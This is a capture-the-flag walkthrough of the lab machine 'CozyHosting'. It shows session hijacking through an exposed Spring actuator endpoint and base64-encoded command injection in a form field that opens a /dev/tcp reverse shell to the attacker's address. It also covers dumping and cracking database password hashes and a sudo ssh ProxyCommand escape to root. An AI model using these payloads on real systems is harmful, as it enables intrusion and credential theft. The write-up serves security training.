## Nmap Scan

I do a `nmap` scan:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.230       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 14:48 EDT
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Service scan Timing: About 80.00% done; ETC: 14:50 (0:00:14 remaining)
Nmap scan report for 10.10.11.230
Host is up (0.11s latency).
Not shown: 984 closed tcp ports (conn-refused)
PORT     STATE    SERVICE          VERSION
22/tcp   open     ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp   open     http             nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
544/tcp  filtered kshell
1117/tcp filtered ardus-mtrns
1234/tcp open     hotline?
1334/tcp open     writesrv?
3269/tcp filtered globalcatLDAPssl
8383/tcp filtered m2mservices
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.32 seconds
```

I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.230    cozyhosting.htb
```


## HTTP

I do a directory enumeration with `ffuf`:
```sh
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://cozyhosting.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 118ms]
    * FUZZ: admin

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
    * FUZZ: asdfjkl;

[Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 132ms]
    * FUZZ: error

[Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 134ms]
    * FUZZ: index

[Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 139ms]
    * FUZZ: login

[Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 196ms]
    * FUZZ: logout

:: Progress: [20476/20476] :: Job [1/1] :: 299 req/sec :: Duration: [0:01:10] :: Errors: 0 ::
```

I do another directory enumeration with `dirsearch`:
```sh
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://cozyhosting.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/cozyhosting.htb/-_23-09-30_15-32-24.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-09-30_15-32-24.log

Target: http://cozyhosting.htb/

[15:32:25] Starting: 
[15:32:39] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[15:32:44] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[15:32:45] 400 -  435B  - /a%5c.aspx                                        
[15:32:47] 200 -  634B  - /actuator                                         
[15:32:47] 200 -    5KB - /actuator/env                                     
[15:32:47] 200 -   15B  - /actuator/health                                  
[15:32:47] 200 -   48B  - /actuator/sessions                                
[15:32:47] 200 -   10KB - /actuator/mappings                                
[15:32:47] 200 -  124KB - /actuator/beans                                   
[15:32:48] 401 -   97B  - /admin                                            
[15:33:19] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
[15:33:19] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
[15:33:19] 500 -   73B  - /error                                            
[15:33:20] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[15:33:21] 200 -    0B  - /extjs/resources//charts.swf                      
[15:33:26] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
[15:33:28] 200 -   12KB - /index                                            
[15:33:34] 200 -    4KB - /login                                            
[15:33:34] 200 -    0B  - /login.wdm%2e                                     
[15:33:35] 204 -    0B  - /logout                                           
[15:33:58] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF                       
                                                                             
Task Completed
```

I see this page `/actuator/sessions`  to leak any session id:
- Request:
```http
GET /actuator/sessions HTTP/1.1
Host: cozyhosting.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=
Connection: close

```

- Response:
```http
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 01 Oct 2023 18:59:21 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 248

{"BC5EE177A2306DBD6A4FEDE269FD315A":"UNAUTHORIZED",
"E125C54B227177F317CFEDE5AC928596":"UNAUTHORIZED",
"B12D30E5B3A15CAB80D18AA9FCC2B778":"UNAUTHORIZED",
"20EDCBE6C9905D775758D2997A7BC920":"kanderson",
"A6E836A30295E3EC408CDB8CC159A6AA":"UNAUTHORIZED"}
```

I have discover a session id, now I can use it  to manipulate the sessions in the the login process, I use `Cookie Editor` extension to insert this value `"20EDCBE6C9905D775758D2997A7BC920"` in the  `Value` field, and then I refresh the page

## Remote Code Execution

I see the `Connection settings` form, I compile it and I Intercept it:
- Request:
```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID="20EDCBE6C9905D775758D2997A7BC920"
Connection: close

host=127.0.0.1&username=cyber
```

- Response:
```http
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 01 Oct 2023 19:07:13 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=Host key verification failed.
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

I can try any payload to discover a possible `Remote Code Execution`, after different attempts I find it:
- Request:
```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 62
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID="20EDCBE6C9905D775758D2997A7BC920"
Connection: close

host=127.0.0.1&username=;echo${IFS}"bHM="|base64${IFS}-d|bash;
```

- Response:
```http
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 01 Oct 2023 19:11:12 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]base64: invalid input/bin/bash: line 1: @127.0.0.1: command not found
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

Now I open a `Listening Port`:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001               
listening on [any] 9001 ...
```

The My Payload:
```sh
sh -i >& /dev/tcp/10.10.14.149/9001 0>&1
```

I encode it to base64, and I send it:
- Request:
```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 114
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID="20EDCBE6C9905D775758D2997A7BC920"
Connection: close

host=127.0.0.1&username=;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ5LzkwMDEgMD4mMQ=="|base64${IFS}-d|bash;
```

- Reverse Shell:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001               
listening on [any] 9001 ...
connect to [10.10.14.149] from (UNKNOWN) [10.10.11.230] 44268
sh: 0: can't access tty; job control turned off
$ python3  -c 'import pty; pty.spawn("/bin/bash")'
app@cozyhosting:/app$ whoami
whoami
app
app@cozyhosting:/app$ ls
ls
cloudhosting-0.0.1.jar 
```

I see a file, I trasfer it in the Local Machine:

- I start a `Web Server` in a Target Machine:
```sh
app@cozyhosting:/app$ python3 -m http.server 1234
python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
```

I take the file in the Local Machine:
```sh
┌──(kali㉿kali)-[~/cozyhosting]
└─$ curl http://cozyhosting.htb:1234/cloudhosting-0.0.1.jar -O cloudhosting-0.0.1.jar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  7 57.4M    7 4384k    0     0   240k      0  0:04:04  0:00:18  0:03:46  374k
```

I extract all files, and I find in this file `/BOOT-INF/classes/application.properties` the credentials for the locally running database which is using postgres:
```sh
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

I login to database:
```sh
app@cozyhosting:/app$ psql -h localhost -d cozyhosting -U postgres
psql -h localhost -d cozyhosting -U postgres
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

cozyhosting=#
```

I  list the available databases with the `\list` command:
```sh
cozyhosting-# \list
\list
WARNING: terminal is not fully functional
Press RETURN to continue 

List of databases
Name|Owner|Encoding|Collate|Ctype|Access privileges
cozyhosting|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|
postgres|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|
template0|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|=c/postgres
postgres=CTc/postgres
template1|postgres|UTF8|en_US.UTF-8|en_US.UTF-8|=c/postgres
postgres=CTc/postgres
(4 rows)
(END)q
Now I’ll connect to the `cozyhoting` database using `\c cozyhosting`. Then, I’ll enumerate the available tables using `\d`.
```

Now I connect to the `cozyhoting` database using `\c cozyhosting`:
```sh
cozyhosting-# \c cozyhosting
\c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
```

Then I enumerate the available tables using `\d`:
```sh
cozyhosting-# \d
\d
WARNING: terminal is not fully functional
Press RETURN to continue 

List of relations
Schema|Name|Type|Owner
public|hosts|table|postgres
public|hosts_id_seq|sequence|postgres
public|users|table|postgres
(3 rows)
(END)q
```

I dump the content of users table:
```sh
cozyhosting=#  SELECT * from users;
 SELECT * from users;
WARNING: terminal is not fully functional
Press RETURN to continue 

name|password|role
kanderson|$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim|User
admin|$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm|Admin
(2 rows)
(END)q
```

I crack the admin hash:
```sh
┌──(kali㉿kali)-[~/cozyhosting]
└─$ touch hash                                                                

┌──(kali㉿kali)-[~/cozyhosting]
└─$ echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash

┌──(kali㉿kali)-[~/cozyhosting]
└─$ john hash -wordlist:/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:36 DONE (2023-10-01 16:02) 0.02730g/s 76.65p/s 76.65c/s 76.65C/s dougie..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now I see all users in the system:
```sh
app@cozyhosting:/app$ cat /etc/passwd | grep '/usr/bin/bash'
cat /etc/passwd | grep '/usr/bin/bash'
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

Credentials:
```
josh:manchesterunited
```

I login like josh:
```sh
┌──(kali㉿kali)-[~]
└─$ ssh josh@cozyhosting.htb 
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct  1 08:08:53 PM UTC 2023

  System load:           0.2099609375
  Usage of /:            55.0% of 5.42GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             253
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.230
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c27


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Oct  1 18:47:00 2023 from 10.10.14.25
josh@cozyhosting:~$ whoami
josh
josh@cozyhosting:~$ ls
cve-2021-4034  CVE-2021-4034-main.zip  exploit.sh  user.txt
josh@cozyhosting:~$ 
```

I take the user flag:
```
josh@cozyhosting:~$ cat user.txt
66a5d304dde873628940ce1248ad060e
```


## Privilege Escalation

I check the sudo permissions:
```sh
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

I can exploit the  `sudo permission` to the  `ssh` command through ProxyCommand option to spawn a root shell:
```sh
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cd /root    
# ls -all
total 40
drwx------  5 root root 4096 Aug 14 13:37 .
drwxr-xr-x 19 root root 4096 Aug 14 14:11 ..
lrwxrwxrwx  1 root root    9 May 18 15:00 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Aug  8 10:10 .cache
-rw-------  1 root root   56 Aug 14 13:37 .lesshst
drwxr-xr-x  3 root root 4096 May 11 19:21 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
lrwxrwxrwx  1 root root    9 May 18 15:00 .psql_history -> /dev/null
-rw-r-----  1 root root   33 Oct  1 15:21 root.txt
drwx------  2 root root 4096 Oct  1 15:34 .ssh
-rw-r--r--  1 root root   39 Aug  8 10:19 .vimrc
```

I take the user flag:
```
# cat root.txt
eec14e15d3b39d0c568cb0f9d15b0460
```